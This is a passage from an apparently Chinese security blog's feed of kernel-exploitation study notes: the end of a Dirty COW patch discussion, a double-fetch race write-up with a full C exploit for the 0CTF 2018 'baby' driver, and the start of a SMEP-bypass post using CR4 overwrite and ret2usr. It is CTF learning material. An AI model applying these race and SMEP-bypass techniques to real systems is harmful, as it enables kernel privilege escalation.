class="keyword">return</span> -EEXIST;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="comment">/*</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">+ * FOLL_FORCE can write to even unwritable pte&#x27;s, but only</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">+ * after we&#x27;ve gone through a COW cycle and they are dirty.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">+ */</span></span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> can_follow_write_pte(<span class="keyword">pte_t</span> pte, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="params"><span class="function">+&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">return</span> pte_write(pte) ||</span></span></span><br><span class="line"><span class="params"><span class="function">+        ((flags &amp; FOLL_FORCE) &amp;&amp; (flags &amp; FOLL_COW) &amp;&amp; pte_dirty(pte));</span></span></span><br><span class="line"><span class="params"><span class="function">+&#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">static</span> struct page *follow_page_pte(struct vm_area_struct *vma,        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="params"><span class="function"> &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-95</span>, <span class="number">7</span> +<span class="number">105</span>, <span class="number">7</span> @@ retry:</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">goto</span> no_page;</span></span></span><br><span class="line"><span class="params"><span class="function">-    <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !can_follow_write_pte(pte, flags)) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">        pte_unmap_unlock(ptep, ptl);</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-412</span>, <span class="number">7</span> +<span class="number">422</span>, <span class="number">7</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,     * reCOWed by userspace write).</span></span></span><br><span class="line"><span class="params"><span class="function">     */</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span></span></span><br><span class="line"><span class="params"><span class="function">-        *flags &amp;= ~FOLL_WRITE;</span></span></span><br><span class="line"><span class="params"><span class="function">+            *flags |= FOLL_COW;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">return</span> <span class="number">0</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/dirtycow/dirtycow.github.io">Dirty COW</a></p><p><a href="https://brucetg.github.io/2018/05/27/DirtyCow%EF%BC%88%E8%84%8F%E7%89%9B%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">DirtyCow（脏牛）漏洞复现</a></p><p><a href="https://www.anquanke.com/post/id/84851">【漏洞分析】11月4日:深入解读脏牛Linux本地提权漏洞（CVE-2016-5195）</a></p><p><a href="https://www.bilibili.com/video/BV1RA411b7fr">星盟ctf战队 b站分享 2020-4-25-GraVity0～linux内核漏洞的分析与利用</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel Double Fetch</title>
      <link href="/note-pwn-kernel-double-fetch/"/>
      <url>/note-pwn-kernel-double-fetch/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/">CTF Wiki Double Fetch</a>, 根据学习情况略有修改</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞,是一种内核态与用户态之间的数据访问竞争。</p><p>在 Linux 等现代操作系统中, 虚拟内存地址通常被划分为内核空间和用户空间。</p><ul><li><strong>内核空间</strong>负责运行内核代码、驱动模块代码等, 权限较高</li><li><strong>用户空间</strong>负责允许用户代码, 并通过系统调用进入内核完成相关功能。</li></ul><p>通常情况下, 用户空间向内核转递数据时, 内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理,但在输入数据较为复杂时,内核可能只引用其指针,而将数据暂时保存在用户空间进行后续处理。此时,该数据存在被其他恶意线程篡改风险,造成内核验证通过数据与实际使用数据不一致,导致内核代码执行异常。</p><p>一个典型<code>Double Fetch</code>漏洞原理如下图所示, 一个用户态线程准备数据并通过系统调用进入内核, 该数据在内核中有两次被取用。</p><p>第一次取用数据进行安全检查(如缓冲区大小、指针可用性等), 当检查通过后内核第二次取用数据进行实际处理。</p><p>而在两次取用数据之间,另一个用户态线程可创造条件竞争,对已通过检查的用户态数据进行篡改,在真实使用时造成访问越界或缓冲区溢出,最终导致内核崩溃或权限提升。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200807152018.png" alt="20200807152018"></p><h2 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>解压题目文件中的<code>core.cpio</code>, 查看<code>init</code>文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  core bat init</span><br><span class="line">───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │</span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t sysfs none /sys</span><br><span class="line">   5   │ mount -t devtmpfs devtmpfs /dev</span><br><span class="line">   6   │ <span class="built_in">echo</span> <span class="string">&quot;flag&#123;this_is_a_sample_flag&#125;&quot;</span> &gt; flag</span><br><span class="line">   7   │ chown root:root flag</span><br><span class="line">   8   │ chmod 400 flag</span><br><span class="line">   9   │ <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">  10   │ <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">  11   │ <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line">  12   │</span><br><span class="line">  13   │ insmod baby.ko</span><br><span class="line">  14   │ chmod 777 /dev/baby</span><br><span class="line">  15   │ <span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">  16   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  17   │</span><br><span class="line">  18   │ umount /proc</span><br><span class="line">  19   │ umount /sys</span><br><span class="line">  20   │ poweroff -d 0  -f</span><br><span class="line">  21   │</span><br><span class="line">───────┴────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以发现 flag 是写在一个文件中, 且存在一个 baby.ko 驱动模块, 那么漏洞应该存在在 baby.ko 中</p><ul><li><code>checksec baby.ko</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="number">0</span>ctf-<span class="keyword">final</span>-baby checksec baby.ko</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/Users/Lantern/Desktop/note/pwn_note/kernal/linux_kernel_pwn-master/0ctf2018-final-baby/0ctf-final-baby/baby.ko&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure><p>用 IDA 打开驱动文件进行分析, flag 是硬编码在驱动文件中的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">0000000000000480</span> flag            dq offset aFlagThisWillBe</span><br><span class="line">.data:<span class="number">0000000000000480</span>                                         ; DATA XREF: baby_ioctl+<span class="number">2</span>A↑r</span><br><span class="line">.data:<span class="number">0000000000000480</span>                                         ; baby_ioctl+DB↑r ...</span><br><span class="line">.data:<span class="number">0000000000000480</span>                                         ; <span class="string">&quot;flag&#123;THIS_WILL_BE_YOUR_FLAG_1234&#125;&quot;</span></span><br><span class="line">.data:<span class="number">0000000000000488</span>                 align <span class="number">20</span>h</span><br></pre></td></tr></table></figure><p>驱动主要注册了一个 <code>baby_ioctl</code> 函数,其中包含两个功能。当 ioctl 中 cmd 参数为 0x6666 时,驱动将输出 flag 的加载地址。当 ioctl 中 cmd 参数为 0x1337 时,首先进行三个校验,接着对用户输入的内容与硬编码的 flag 进行逐字节比较,当一致时通过 <code>printk</code> 将 flag 输出出来。</p><p>其中 attr 结构体如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  attr *v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  attr *v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok((<span class="keyword">char</span> *)v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               v5-&gt;flag_str,</span><br><span class="line">               v5-&gt;flag_len,</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; v5-&gt;flag_len == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5-&gt;flag_str[i] != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x16</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xE</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而分析其检查函数,其中 _chk_range_not_ok 为检查指针及长度范围是否指向用户空间。通过对驱动文件功能的分析,可以得到用户输入的数据结构体如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 attr            struc ; (sizeof=0xC, mappedto_3)</span><br><span class="line">00000000 flag_str        dq ?                    ; offset</span><br><span class="line">00000008 flag_len        dd ?</span><br><span class="line">0000000C attr            ends</span><br></pre></td></tr></table></figure><p>其检查内容为:</p><ol><li>输入的数据指针是否为用户态数据。</li><li>数据指针内 flag_str 是否指向用户态。</li><li>据指针内 flag_len 是否等于硬编码 flag 的长度。</li></ol><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>此题存在一个<code>Double Fetch</code>漏洞, 当用户输入数据通过验证后, 再将<code>flag_str</code>所指向的地址改为 flag 硬编码地址后, 即会输出 flag 内容</p><ol><li><p>首先, 利用提供的<code>cmd=0x6666</code>功能, 获取内核中 flag 的加载地址</p><blockquote><p>内核中以 <code>printk</code> 输出的内容,可以通过 <code>dmesg</code> 命令查看。</p></blockquote></li><li><p>然后,构造符合 <code>cmd=0x1337</code> 功能的数据结构,其中 <code>flag_len</code> 可以从硬编码中直接获取为 33, <code>flag_str</code> 指向一个用户空间地址。</p></li><li><p>最后,创建一个恶意线程, 不断的将 flag_str 所指向的用户态地址修改为 flag 的内核地址以制造竞争条件,从而使其通过驱动中的逐字节比较检查,输出 flag 内容。</p></li></ol><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -lpthread -o exp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strstr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *haystack, <span class="keyword">const</span> <span class="keyword">char</span> *needle)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcasestr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *haystack, <span class="keyword">const</span> <span class="keyword">char</span> *needle)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRYTIME 0x1000  <span class="comment">//碰撞次数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *flag;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr;</span><br><span class="line"><span class="keyword">int</span> finish =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> buf[LEN+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//线程函数,不断修改flag指向的地址为内核中flag地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_attr_value</span><span class="params">(<span class="keyword">void</span> *s)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> * <span class="title">s1</span> =</span> s;</span><br><span class="line">    <span class="keyword">while</span>(finish==<span class="number">0</span>)&#123;</span><br><span class="line">    s1-&gt;flag = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> addr_fd;</span><br><span class="line">    <span class="keyword">char</span> *idx;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> ret = ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//获取内核硬编码的flag地址</span></span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    addr_fd = open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    lseek(addr_fd,-LEN,SEEK_END);</span><br><span class="line">    read(addr_fd,buf,LEN);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Not found addr&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        idx+=<span class="number">16</span>;</span><br><span class="line">        addr = strtoull(idx,idx+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]flag addr: %p\n&quot;</span>,addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造attr数据结构</span></span><br><span class="line">    t.len = <span class="number">33</span>;</span><br><span class="line">    t.flag = buf;</span><br><span class="line">    <span class="comment">//新建恶意线程</span></span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, change_attr_value,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;TRYTIME;i++)&#123;</span><br><span class="line">        ret = ioctl(fd, <span class="number">0x1337</span>, &amp;t);</span><br><span class="line">        t.flag = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]result is :&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li><p>需关闭 dmesg_restrict ,否则无法查看 printk 信息,具体操作是在启动脚本中加入:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure></li><li><p>配置 QEMU 启动参数时, 不要开启 <code>SMAP</code> 保护,否则在内核中直接访问用户态数据会引起 <code>kerne panic</code></p></li><li><p>配置 QEMU 启动参数时,需要配置为非单核单线程启动,否则无法触发题目中的竞争条件。具体操作是在启动参数中增加其内核数选项,如</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-smp 2,cores=2,threads=1  \</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>在启动后,可通过 <code>/proc/cpuinfo</code> 查看当前运行的内核数及超线程数。</p></blockquote><p>最后,此题存在一种侧信道攻击的非预期解法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于是 flag 是硬编码的,并且是检查方法是逐字节比较,因此可以逐字节爆破来得到 flag。</span><br><span class="line"></span><br><span class="line">方法是将待爆破的字节放在 mmap 申请的内存页末位,此时下一字节位于不可读写的用户态空间。当得到正确的一字节时,内核会比较用户空间内下一个字节的正确性,由于该地址是不可读的,将导致 kernel panic,从而可以判断是否爆破的一个字节正确。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel bypass-smep</title>
      <link href="/note-pwn-kernel-smep/"/>
      <url>/note-pwn-kernel-smep/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/bypass_smep-zh/">CTF Wiki bypass-smep</a> 根据学习情况略有修改</p><h2 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h2><p>为了防止<code>ret2usr</code>攻击,内核开发者提出了<code>smep</code>保护(<code>Supervisor Mode Execution Protection</code>)。<code>smep</code>是内核的一种保护措施,作用是当 CPU 处于 <code>ring0</code> 模式时,执行<code>用户空间代码</code>会触发页错误；这个保护在 arm 中被称为 <code>PXN</code></p><p>通过 <code>qemu</code> 启动内核时的选项可以判断是否开启了 <code>smep</code> 保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ciscn2017_babydriver grep smep ./boot.sh</span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>最后面有一个<code>+smep</code>表示开启。 也可以通过</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep smep /proc/cpuinfo</span><br></pre></td></tr></table></figure><p>俩检查保护是否开启, 如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200807141828.png" alt="20200807141828"></p><h2 id="SMEP-和-CR4-寄存器"><a href="#SMEP-和-CR4-寄存器" class="headerlink" title="SMEP 和 CR4 寄存器"></a>SMEP 和 CR4 寄存器</h2><p>系统根据 CR4 寄存器的值判断是否开启 smep 保护, 当 CR4 寄存器的第 20 位是 1 时, 保护开启; 是 0 时, 保护关闭</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200807142207.png" alt="20200807142207"></p><p>例如, 当</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000</span><br></pre></td></tr></table></figure><p>时, smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的, 因此只需要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov cr4, 0x1407e0</span><br><span class="line"># 0x1407e0 = 101 0 0000 0011 1111 00000</span><br></pre></td></tr></table></figure><p>即可关闭 smep 保护。</p><p>搜索一下从 vmlinux 中提取出的 gadget,很容易就能达到这个目的。</p><ul><li>如何查看 CR4 寄存器的值？<ul><li>gdb 无法查看 cr4 寄存器的值,可以通过 kernel crash 时的信息查看。为了关闭 smep 保护,常用一个固定值 0x6f0,即 <code>mov cr4, 0x6f0</code></li></ul></li></ul><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017_babydriver"></a>CISCN2017_babydriver</h2><p>之前已经分析过使用 uaf 改 cred 的做法,这次换一种方法,通过关闭 smep 保护和 ret2usr 来提权。</p><p>这里选取的方法是先通过 uaf 控制一个 <code>tty_struct</code> 结构,在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配这样一个结构体</p><p>tty_struct 的 <a href="https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct">源码</a> 如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>, <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>, <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span 